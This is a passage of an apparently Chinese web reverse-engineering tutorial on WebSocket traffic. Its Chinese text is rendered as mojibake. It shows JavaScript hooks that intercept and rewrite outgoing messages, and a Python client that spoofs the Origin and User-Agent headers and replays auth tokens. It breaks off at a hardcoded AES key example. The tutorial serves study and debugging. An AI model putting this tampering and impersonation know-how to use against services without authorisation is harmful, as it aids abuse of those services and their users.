<span class="w">            </span><span class="k">debugger</span><span class="p">;</span><span class="w">  </span><span class="c1">// å‘é€å‰æ–­ç‚¹</span>
<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="nx">_send</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="nx">arguments</span><span class="p">);</span>
<span class="w">        </span><span class="p">};</span>

<span class="w">        </span><span class="c1">// Hook message äº‹ä»¶</span>
<span class="w">        </span><span class="nx">ws</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s1">&#39;message&#39;</span><span class="p">,</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;[WS Recv]&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">e</span><span class="p">.</span><span class="nx">data</span><span class="p">);</span>
<span class="w">        </span><span class="p">});</span>

<span class="w">        </span><span class="c1">// Hook close äº‹ä»¶</span>
<span class="w">        </span><span class="nx">ws</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s1">&#39;close&#39;</span><span class="p">,</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;[WS Close]&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">e</span><span class="p">.</span><span class="nx">code</span><span class="p">,</span><span class="w"> </span><span class="nx">e</span><span class="p">.</span><span class="nx">reason</span><span class="p">);</span>
<span class="w">        </span><span class="p">});</span>

<span class="w">        </span><span class="c1">// Hook error äº‹ä»¶</span>
<span class="w">        </span><span class="nx">ws</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s1">&#39;error&#39;</span><span class="p">,</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="s1">&#39;[WS Error]&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">e</span><span class="p">);</span>
<span class="w">        </span><span class="p">});</span>

<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">ws</span><span class="p">;</span>
<span class="w">    </span><span class="p">};</span>
<span class="p">})();</span>
</code></pre>
      </div>

      <h3 id="42-ä¿®æ”¹æ¶ˆæ¯å†…å®¹">4.2 ä¿®æ”¹æ¶ˆæ¯å†…å®¹</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">const</span><span class="w"> </span><span class="nx">_send</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">ws</span><span class="p">.</span><span class="nx">send</span><span class="p">;</span>
<span class="nx">ws</span><span class="p">.</span><span class="nx">send</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="c1">// è§£æ JSON</span>
<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="nx">msg</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">JSON</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="nx">data</span><span class="p">);</span>

<span class="w">    </span><span class="c1">// ä¿®æ”¹å†…å®¹</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">type</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="s1">&#39;chat&#39;</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">msg</span><span class="p">.</span><span class="nx">message</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;Modified by hook!&#39;</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="c1">// å‘é€ä¿®æ”¹åçš„æ¶ˆæ¯</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">_send</span><span class="p">.</span><span class="nx">call</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="nb">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">(</span><span class="nx">msg</span><span class="p">));</span>
<span class="p">};</span>
</code></pre>
      </div>

      <h3 id="43-æ‹¦æˆªäºŒè¿›åˆ¶æ¶ˆæ¯">4.3 æ‹¦æˆªäºŒè¿›åˆ¶æ¶ˆæ¯</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="nx">ws</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s1">&#39;message&#39;</span><span class="p">,</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">data</span><span class="w"> </span><span class="ow">instanceof</span><span class="w"> </span><span class="nb">ArrayBuffer</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="c1">// äºŒè¿›åˆ¶æ•°æ®</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">view</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nb">Uint8Array</span><span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">data</span><span class="p">);</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;[Binary]&#39;</span><span class="p">,</span><span class="w"> </span><span class="nb">Array</span><span class="p">.</span><span class="kr">from</span><span class="p">(</span><span class="nx">view</span><span class="p">).</span><span class="nx">map</span><span class="p">(</span><span class="nx">b</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">b</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mf">16</span><span class="p">).</span><span class="nx">padStart</span><span class="p">(</span><span class="mf">2</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;0&#39;</span><span class="p">)).</span><span class="nx">join</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">));</span>
<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="c1">// æ–‡æœ¬æ•°æ®</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;[Text]&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">e</span><span class="p">.</span><span class="nx">data</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">});</span>
</code></pre>
      </div>

      <hr />

      <h2 id="5-python-å®¢æˆ·ç«¯å®ç°">5. Python å®¢æˆ·ç«¯å®ç°</h2>

      <h3 id="51-åŸºç¡€è¿æ¥">5.1 åŸºç¡€è¿æ¥</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">asyncio</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">websockets</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">json</span>

<span class="k">async</span> <span class="k">def</span><span class="w"> </span><span class="nf">connect</span><span class="p">():</span>
    <span class="n">uri</span> <span class="o">=</span> <span class="s2">&quot;wss://example.com/socket&quot;</span>

    <span class="k">async</span> <span class="k">with</span> <span class="n">websockets</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="n">uri</span><span class="p">)</span> <span class="k">as</span> <span class="n">ws</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;å·²è¿æ¥&quot;</span><span class="p">)</span>

        <span class="c1"># å‘é€æ¶ˆæ¯</span>
        <span class="k">await</span> <span class="n">ws</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">({</span>
            <span class="s2">&quot;type&quot;</span><span class="p">:</span> <span class="s2">&quot;auth&quot;</span><span class="p">,</span>
            <span class="s2">&quot;token&quot;</span><span class="p">:</span> <span class="s2">&quot;your_token_here&quot;</span>
        <span class="p">}))</span>

        <span class="c1"># æ¥æ”¶æ¶ˆæ¯</span>
        <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
            <span class="n">message</span> <span class="o">=</span> <span class="k">await</span> <span class="n">ws</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
            <span class="n">data</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">message</span><span class="p">)</span>
            <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;æ”¶åˆ°:&quot;</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>

<span class="n">asyncio</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">connect</span><span class="p">())</span>
</code></pre>
      </div>

      <h3 id="52-å®Œæ•´å®¢æˆ·ç«¯ç±»">5.2 å®Œæ•´å®¢æˆ·ç«¯ç±»</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">asyncio</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">websockets</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">json</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">time</span>

<span class="k">class</span><span class="w"> </span><span class="nc">WebSocketClient</span><span class="p">:</span>
    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">uri</span><span class="p">,</span> <span class="n">token</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">uri</span> <span class="o">=</span> <span class="n">uri</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">token</span> <span class="o">=</span> <span class="n">token</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">ws</span> <span class="o">=</span> <span class="kc">None</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">running</span> <span class="o">=</span> <span class="kc">False</span>

    <span class="k">async</span> <span class="k">def</span><span class="w"> </span><span class="nf">connect</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;è¿æ¥ WebSocket&quot;&quot;&quot;</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">ws</span> <span class="o">=</span> <span class="k">await</span> <span class="n">websockets</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">uri</span><span class="p">,</span>
            <span class="n">extra_headers</span><span class="o">=</span><span class="p">{</span>
                <span class="s2">&quot;User-Agent&quot;</span><span class="p">:</span> <span class="s2">&quot;Mozilla/5.0&quot;</span><span class="p">,</span>
                <span class="s2">&quot;Origin&quot;</span><span class="p">:</span> <span class="s2">&quot;https://example.com&quot;</span>
            <span class="p">}</span>
        <span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">running</span> <span class="o">=</span> <span class="kc">True</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[è¿æ¥æˆåŠŸ]&quot;</span><span class="p">)</span>

        <span class="c1"># å‘é€è®¤è¯æ¶ˆæ¯</span>
        <span class="k">await</span> <span class="bp">self</span><span class="o">.</span><span class="n">send_message</span><span class="p">({</span>
            <span class="s2">&quot;type&quot;</span><span class="p">:</span> <span class="s2">&quot;auth&quot;</span><span class="p">,</span>
            <span class="s2">&quot;token&quot;</span><span class="p">:</span> <span class="bp">self</span><span class="o">.</span><span class="n">token</span>
        <span class="p">})</span>

    <span class="k">async</span> <span class="k">def</span><span class="w"> </span><span class="nf">send_message</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;å‘é€æ¶ˆæ¯&quot;&quot;&quot;</span>
        <span class="n">message</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
        <span class="k">await</span> <span class="bp">self</span><span class="o">.</span><span class="n">ws</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">message</span><span class="p">)</span>
        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[å‘é€] </span><span class="si">{</span><span class="n">message</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>

    <span class="k">async</span> <span class="k">def</span><span class="w"> </span><span class="nf">receive_loop</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;æ¥æ”¶æ¶ˆæ¯å¾ªç¯&quot;&quot;&quot;</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="k">while</span> <span class="bp">self</span><span class="o">.</span><span class="n">running</span><span class="p">:</span>
                <span class="n">message</span> <span class="o">=</span> <span class="k">await</span> <span class="bp">self</span><span class="o">.</span><span class="n">ws</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
                <span class="k">await</span> <span class="bp">self</span><span class="o">.</span><span class="n">handle_message</span><span class="p">(</span><span class="n">message</span><span class="p">)</span>
        <span class="k">except</span> <span class="n">websockets</span><span class="o">.</span><span class="n">ConnectionClosed</span><span class="p">:</span>
            <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[è¿æ¥å·²å…³é—­]&quot;</span><span class="p">)</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">running</span> <span class="o">=</span> <span class="kc">False</span>

    <span class="k">async</span> <span class="k">def</span><span class="w"> </span><span class="nf">handle_message</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">message</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;å¤„ç†æ”¶åˆ°çš„æ¶ˆæ¯&quot;&quot;&quot;</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">data</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">message</span><span class="p">)</span>
            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[æ”¶åˆ°] </span><span class="si">{</span><span class="n">data</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>

            <span class="c1"># æ ¹æ®æ¶ˆæ¯ç±»å‹å¤„ç†</span>
            <span class="k">if</span> <span class="n">data</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;type&quot;</span><span class="p">)</span> <span class="o">==</span> <span class="s2">&quot;ping&quot;</span><span class="p">:</span>
                <span class="c1"># å“åº”å¿ƒè·³</span>
                <span class="k">await</span> <span class="bp">self</span><span class="o">.</span><span class="n">send_message</span><span class="p">({</span><span class="s2">&quot;type&quot;</span><span class="p">:</span> <span class="s2">&quot;pong&quot;</span><span class="p">})</span>

            <span class="k">elif</span> <span class="n">data</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;type&quot;</span><span class="p">)</span> <span class="o">==</span> <span class="s2">&quot;data&quot;</span><span class="p">:</span>
                <span class="c1"># å¤„ç†ä¸šåŠ¡æ•°æ®</span>
                <span class="bp">self</span><span class="o">.</span><span class="n">process_data</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>

        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[é”™è¯¯] å¤„ç†æ¶ˆæ¯å¤±è´¥: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">process_data</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;å¤„ç†ä¸šåŠ¡æ•°æ®&quot;&quot;&quot;</span>
        <span class="c1"># è¿™é‡Œå®ç°ä½ çš„ä¸šåŠ¡é€»è¾‘</span>
        <span class="k">pass</span>

    <span class="k">async</span> <span class="k">def</span><span class="w"> </span><span class="nf">heartbeat_loop</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;å¿ƒè·³å¾ªç¯&quot;&quot;&quot;</span>
        <span class="k">while</span> <span class="bp">self</span><span class="o">.</span><span class="n">running</span><span class="p">:</span>
            <span class="k">await</span> <span class="n">asyncio</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">30</span><span class="p">)</span>  <span class="c1"># æ¯ 30 ç§’</span>
            <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">running</span><span class="p">:</span>
                <span class="k">await</span> <span class="bp">self</span><span class="o">.</span><span class="n">send_message</span><span class="p">({</span><span class="s2">&quot;type&quot;</span><span class="p">:</span> <span class="s2">&quot;ping&quot;</span><span class="p">})</span>

    <span class="k">async</span> <span class="k">def</span><span class="w"> </span><span class="nf">run</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;è¿è¡Œå®¢æˆ·ç«¯&quot;&quot;&quot;</span>
        <span class="k">await</span> <span class="bp">self</span><span class="o">.</span><span class="n">connect</span><span class="p">()</span>

        <span class="c1"># å¹¶å‘è¿è¡Œæ¥æ”¶å¾ªç¯å’Œå¿ƒè·³å¾ªç¯</span>
        <span class="k">await</span> <span class="n">asyncio</span><span class="o">.</span><span class="n">gather</span><span class="p">(</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">receive_loop</span><span class="p">(),</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">heartbeat_loop</span><span class="p">()</span>
        <span class="p">)</span>

    <span class="k">async</span> <span class="k">def</span><span class="w"> </span><span class="nf">close</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;å…³é—­è¿æ¥&quot;&quot;&quot;</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">running</span> <span class="o">=</span> <span class="kc">False</span>
        <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">ws</span><span class="p">:</span>
            <span class="k">await</span> <span class="bp">self</span><span class="o">.</span><span class="n">ws</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
            <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[å·²æ–­å¼€è¿æ¥]&quot;</span><span class="p">)</span>

<span class="c1"># ä½¿ç”¨</span>
<span class="k">async</span> <span class="k">def</span><span class="w"> </span><span class="nf">main</span><span class="p">():</span>
    <span class="n">client</span> <span class="o">=</span> <span class="n">WebSocketClient</span><span class="p">(</span>
        <span class="n">uri</span><span class="o">=</span><span class="s2">&quot;wss://example.com/socket&quot;</span><span class="p">,</span>
        <span class="n">token</span><span class="o">=</span><span class="s2">&quot;your_token_here&quot;</span>
    <span class="p">)</span>

    <span class="k">try</span><span class="p">:</span>
        <span class="k">await</span> <span class="n">client</span><span class="o">.</span><span class="n">run</span><span class="p">()</span>
    <span class="k">except</span> <span class="ne">KeyboardInterrupt</span><span class="p">:</span>
        <span class="k">await</span> <span class="n">client</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>

<span class="n">asyncio</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">main</span><span class="p">())</span>
</code></pre>
      </div>

      <h3 id="53-æ–­çº¿é‡è¿">5.3 æ–­çº¿é‡è¿</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="k">class</span><span class="w"> </span><span class="nc">WebSocketClient</span><span class="p">:</span>
    <span class="c1"># ... å‰é¢çš„ä»£ç  ...</span>

    <span class="k">async</span> <span class="k">def</span><span class="w"> </span><span class="nf">run_with_reconnect</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;å¸¦è‡ªåŠ¨é‡è¿çš„è¿è¡Œ&quot;&quot;&quot;</span>
        <span class="n">max_retries</span> <span class="o">=</span> <span class="mi">5</span>
        <span class="n">retry_count</span> <span class="o">=</span> <span class="mi">0</span>

        <span class="k">while</span> <span class="n">retry_count</span> <span class="o">&lt;</span> <span class="n">max_retries</span><span class="p">:</span>
            <span class="k">try</span><span class="p">:</span>
                <span class="k">await</span> <span class="bp">self</span><span class="o">.</span><span class="n">connect</span><span class="p">()</span>
                <span class="n">retry_count</span> <span class="o">=</span> <span class="mi">0</span>  <span class="c1"># è¿æ¥æˆåŠŸï¼Œé‡ç½®è®¡æ•°</span>

                <span class="k">await</span> <span class="n">asyncio</span><span class="o">.</span><span class="n">gather</span><span class="p">(</span>
                    <span class="bp">self</span><span class="o">.</span><span class="n">receive_loop</span><span class="p">(),</span>
                    <span class="bp">self</span><span class="o">.</span><span class="n">heartbeat_loop</span><span class="p">()</span>
                <span class="p">)</span>

            <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
                <span class="n">retry_count</span> <span class="o">+=</span> <span class="mi">1</span>
                <span class="n">wait_time</span> <span class="o">=</span> <span class="nb">min</span><span class="p">(</span><span class="mi">2</span> <span class="o">**</span> <span class="n">retry_count</span><span class="p">,</span> <span class="mi">60</span><span class="p">)</span>  <span class="c1"># æŒ‡æ•°é€€é¿ï¼Œæœ€å¤š 60 ç§’</span>
                <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[é”™è¯¯] </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
                <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[é‡è¿] </span><span class="si">{</span><span class="n">retry_count</span><span class="si">}</span><span class="s2">/</span><span class="si">{</span><span class="n">max_retries</span><span class="si">}</span><span class="s2">ï¼Œç­‰å¾… </span><span class="si">{</span><span class="n">wait_time</span><span class="si">}</span><span class="s2"> ç§’...&quot;</span><span class="p">)</span>
                <span class="k">await</span> <span class="n">asyncio</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="n">wait_time</span><span class="p">)</span>

        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[å¤±è´¥] è¶…è¿‡æœ€å¤§é‡è¯•æ¬¡æ•°&quot;</span><span class="p">)</span>
</code></pre>
      </div>

      <h3 id="54-å¤„ç†äºŒè¿›åˆ¶æ¶ˆæ¯">5.4 å¤„ç†äºŒè¿›åˆ¶æ¶ˆæ¯</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">struct</span>

<span class="k">class</span><span class="w"> </span><span class="nc">WebSocketClient</span><span class="p">:</span>
    <span class="k">async</span> <span class="k">def</span><span class="w"> </span><span class="nf">handle_message</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">message</span><span class="p">):</span>
        <span class="c1"># åˆ¤æ–­æ¶ˆæ¯ç±»å‹</span>
        <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">message</span><span class="p">,</span> <span class="nb">bytes</span><span class="p">):</span>
            <span class="c1"># äºŒè¿›åˆ¶æ¶ˆæ¯</span>
            <span class="k">await</span> <span class="bp">self</span><span class="o">.</span><span class="n">handle_binary_message</span><span class="p">(</span><span class="n">message</span><span class="p">)</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="c1"># æ–‡æœ¬æ¶ˆæ¯</span>
            <span class="k">await</span> <span class="bp">self</span><span class="o">.</span><span class="n">handle_text_message</span><span class="p">(</span><span class="n">message</span><span class="p">)</span>

    <span class="k">async</span> <span class="k">def</span><span class="w"> </span><span class="nf">handle_binary_message</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;å¤„ç†äºŒè¿›åˆ¶æ¶ˆæ¯&quot;&quot;&quot;</span>
        <span class="c1"># ç¤ºä¾‹ï¼šè‡ªå®šä¹‰åè®®</span>
        <span class="n">msg_type</span><span class="p">,</span> <span class="n">user_id</span><span class="p">,</span> <span class="n">timestamp</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s1">&#39;&gt;BHI&#39;</span><span class="p">,</span> <span class="n">data</span><span class="p">[:</span><span class="mi">7</span><span class="p">])</span>
        <span class="n">payload</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">7</span><span class="p">:]</span>

        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[äºŒè¿›åˆ¶] type=</span><span class="si">{</span><span class="n">msg_type</span><span class="si">}</span><span class="s2">, user_id=</span><span class="si">{</span><span class="n">user_id</span><span class="si">}</span><span class="s2">, time=</span><span class="si">{</span><span class="n">timestamp</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[Payload] </span><span class="si">{</span><span class="n">payload</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>

    <span class="k">async</span> <span class="k">def</span><span class="w"> </span><span class="nf">handle_text_message</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">message</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;å¤„ç†æ–‡æœ¬æ¶ˆæ¯&quot;&quot;&quot;</span>
        <span class="n">data</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">message</span><span class="p">)</span>
        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[æ–‡æœ¬] </span><span class="si">{</span><span class="n">data</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
</code></pre>
      </div>

      <hr />

      <h2 id="6-è®¤è¯ä¸å®‰å…¨">6. è®¤è¯ä¸å®‰å…¨</h2>

      <h3 id="61-token-è®¤è¯">6.1 Token è®¤è¯</h3>

      <p><strong>æ–¹å¼ 1: åœ¨è¿æ¥ URL ä¸­ä¼ é€’</strong></p>

      <div class="codehilite">
        <pre><span></span><code><span class="n">uri</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;wss://example.com/socket?token=</span><span class="si">{</span><span class="n">token</span><span class="si">}</span><span class="s2">&quot;</span>
</code></pre>
      </div>

      <p><strong>æ–¹å¼ 2: åœ¨ Header ä¸­ä¼ é€’</strong></p>

      <div class="codehilite">
        <pre><span></span><code><span class="n">ws</span> <span class="o">=</span> <span class="k">await</span> <span class="n">websockets</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span>
    <span class="n">uri</span><span class="p">,</span>
    <span class="n">extra_headers</span><span class="o">=</span><span class="p">{</span><span class="s2">&quot;Authorization&quot;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&quot;Bearer </span><span class="si">{</span><span class="n">token</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">}</span>
<span class="p">)</span>
</code></pre>
      </div>

      <p><strong>æ–¹å¼ 3: è¿æ¥åå‘é€è®¤è¯æ¶ˆæ¯</strong></p>

      <div class="codehilite">
        <pre><span></span><code><span class="k">await</span> <span class="n">ws</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">({</span><span class="s2">&quot;type&quot;</span><span class="p">:</span> <span class="s2">&quot;auth&quot;</span><span class="p">,</span> <span class="s2">&quot;token&quot;</span><span class="p">:</span> <span class="n">token</span><span class="p">}))</span>
<span class="n">response</span> <span class="o">=</span> <span class="k">await</span> <span class="n">ws</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
<span class="c1"># éªŒè¯è®¤è¯æ˜¯å¦æˆåŠŸ</span>
</code></pre>
      </div>

      <h3 id="62-åŠ å¯†æ¶ˆæ¯">6.2 åŠ å¯†æ¶ˆæ¯</h3>

      <p><strong>æ¡ˆä¾‹</strong>: æŸèŠå¤©åº”ç”¨çš„ AES åŠ å¯†</p>

      <p><strong>æµè§ˆå™¨ç«¯</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// å‘é€å‰åŠ å¯†</span>
<span class="kd">function</span><span class="w"> </span><span class="nx">sendEncrypted</span><span class="p">(</span><span class="nx">ws</span><span class="p">,</span><span class="w"> </span><span class="nx">data</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">key</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">CryptoJS</span><span class="p">.</span><span class="nx">enc</span><span class="p">.</span><span class="nx">Utf8</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="s2">&quot;1234567890abcdef&quot;</span><span class="p">);</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">iv</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">CryptoJS</span><span class="p">.</span><span class="nx">enc</span><span class="p">.</span><span class="nx">Utf8</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="s2">&quot;abcdef1234567890&quot;</span><span class="p">);</span>
